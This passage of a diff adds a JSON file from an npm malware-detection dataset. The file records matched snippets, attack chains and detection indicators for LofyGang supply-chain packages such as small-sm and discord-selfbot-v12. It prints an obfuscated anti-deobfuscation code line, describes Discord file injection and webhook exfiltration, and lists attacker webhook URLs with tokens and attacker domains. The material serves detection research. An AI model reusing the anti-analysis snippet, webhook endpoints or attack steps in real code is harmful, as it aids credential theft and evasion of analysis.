+                  "violated_expectations": "Legitimate open-source packages do not implement event loop jamming or anti-analysis logic to prevent code inspection.",
+                  "similar_legitimate_use": "Such techniques are rarely used outside of DRM or anti-tamper systems, and are not appropriate in open-source or user-facing packages.",
+                  "key_indicators": [
+                    "Obfuscated code with anti-analysis logic",
+                    "Event loop jamming via recursive regular expressions",
+                    "Detection of debugging or deobfuscation attempts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when deobfuscation/debugging attempted)",
+                  "file_location": "obfuscated payloads in malicious npm packages",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "small-sm",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (multiple versions, ~200 packages in total)",
+                  "why_malicious": "The package is part of a coordinated supply chain attack campaign by LofyGang, designed to steal sensitive information such as Discord tokens, credit card data, and streaming/gaming account credentials. The campaign leverages techniques including typosquatting, starjacking, sub-dependency hiding, and persistent malware to evade detection and maintain access. The package modifies files in the Discord installation directory to intercept and exfiltrate sensitive data to attacker-controlled Discord webhooks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim installs a typosquatted or starjacked npm package (e.g., small-sm).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious sub-dependency is loaded and executed, initiating the attack."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code modifies the installed Discord application to hook into payment and credential flows.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data such as tokens and credit card information is intercepted from the Discord application."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Intercepted data is exfiltrated to attacker-controlled Discord webhooks.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and payment data via Discord webhooks."
+                  },
+                  {
+                    "step": 4,
+                    "action": "If analysis or deobfuscation is attempted, anti-debugging code jams the event loop to hinder reverse engineering.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Analysis is delayed or prevented, increasing the persistence and stealth of the malware."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package loading hidden or obfuscated sub-dependencies at import-time",
+                    "Modification of Discord desktop application files, especially index.js in discord_desktop_core",
+                    "Interception and exfiltration of payment or credential data via webRequest or similar APIs",
+                    "Presence of anti-debugging or anti-deobfuscation logic such as event loop jamming"
+                  ],
+                  "file_indicators": [
+                    "C:\\Users\\*\\AppData\\Local\\Discord\\app-*-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js (modified)",
+                    "Obfuscated or suspicious sub-dependencies in node_modules directory",
+                    "Unexpected changes to Discord installation files after npm package installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to Discord webhook URLs (e.g., canary.discord.com/api/webhooks/1010307578896584765/kfko3kvm_uwgTjZlGgmTnHirUnfqDageyMj5XrPBKn, 101030766646531165/uhn_60tOz9hB4bDV7YiwiQxvZ4DMJZtaQ4Gn1E8g, 1010307734369813350/oj2i46ek3xUABqPYFkz81kHzCJOazzbpmtSnA-h7o)",
+                    "Unexpected network requests from npm package install or runtime to Discord webhook endpoints"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that load obfuscated or hidden sub-dependencies, especially those that subsequently modify files in Discord's installation directory. Use file integrity monitoring to detect unauthorized changes to Discord application files, particularly index.js in discord_desktop_core. Detect outbound network requests to Discord webhook endpoints or other suspicious domains during or after package installation. Flag packages containing anti-debugging or anti-deobfuscation logic, such as event loop jamming. Correlate these behaviors to identify coordinated supply chain attacks."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195355_942954_snippet_4",
+              "source_package": "discord-selfbot-v12 (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195355_942954/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3638758361339569,
+              "code_similarity": 0.3355226516723633,
+              "behavior_similarity": 0.39222902059555054,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "_0x1f2d80 = _0x2268f1(this, function () { return _0x1f2d80.toString().search('(((.+)+)+)+$').toString().constructor(_0x1f2d80).search('(((.+)+)+)+$') })",
+                "code_behavior": "At runtime, the code executes anti-deobfuscation logic that jams the event loop if deobfuscation tools or analysis are detected, thereby hindering reverse engineering and automated analysis.",
+                "malice_analysis": {
+                  "why_suspicious": "Anti-analysis and anti-debugging techniques are commonly used in malware to evade detection and frustrate reverse engineering efforts.",
+                  "violated_expectations": "Legitimate open-source code does not attempt to prevent analysis or intentionally degrade application performance.",
+                  "similar_legitimate_use": "Obfuscation may be used for commercial software protection, but not for open-source packages or to actively hinder analysis.",
+                  "key_indicators": [
+                    "Obfuscated JavaScript code with anti-debugging logic",
+                    "Event loop jamming or infinite loops triggered by analysis tools",
+                    "Code patterns designed to detect or respond to deobfuscation attempts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "obfuscated payloads in various .js files",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "discord-selfbot-v12",
+                  "package_manager": "npm",
+                  "package_versions": "12.5.2, 12.5.1, 12.4.9",
+                  "why_malicious": "LofyGang’s packages are explicitly crafted to steal sensitive user data, including credit card information, Discord authentication tokens, and streaming/gaming account credentials. The malware exfiltrates this data to attacker-controlled Discord webhooks and remote infrastructure, and achieves persistence by modifying legitimate Discord application files. The threat actors employ typosquatting, starjacking, and sub-dependency hiding to evade detection and maximize distribution."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim installs a typosquatted or starjacked malicious NPM package.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious sub-dependency is loaded and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious sub-dependency downloads or executes further payloads, including code to modify Discord installation or steal credentials.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "System and application compromise."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malware hooks into Discord or other applications, intercepts sensitive data (tokens, credit cards, passwords).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Data exfiltration to attacker-controlled webhooks."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Anti-analysis code executes to hinder detection and reverse engineering.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Persistence and evasion."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "NPM packages or sub-dependencies initiating network requests to Discord webhooks or suspicious external domains",
+                    "Modification or injection of code into Discord installation files (e.g., discord_desktop_core/index.js)",
+                    "Presence of obfuscated or anti-debugging JavaScript code in package or sub-dependencies",
+                    "Access and exfiltration of credential or payment data via network requests"
+                  ],
+                  "file_indicators": [
+                    "Injected or modified files in Discord’s appdata directory, specifically discord_desktop_core/index.js",
+                    "Presence of sub-dependencies with no legitimate functionality (e.g., small-sm)",
+                    "Obfuscated .js files containing anti-analysis or event loop jamming logic"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS requests to Discord webhooks (e.g., canary.discord.com/api/webhooks/...)",
+                    "Connections to attacker infrastructure such as glitch.me, repl.it, herokuapp.com, pastebin.com, raw.githubusercontent.com"
+                  ],
+                  "how_to_detect": "Monitor for NPM packages and their dependencies making unexpected network requests, especially to Discord webhooks or known C2 domains. Detect unauthorized modifications to Discord’s core files and the presence of obfuscated or anti-analysis code in package directories. Flag packages using typosquatting, starjacking, or sub-dependency hiding techniques. Correlate file and network indicators with known IOCs to identify malicious activity."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@peaceroad##markdown-it-hr-sandwiched-semantic-container/0.5.0/package/docs/output-semantics-for-readme.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
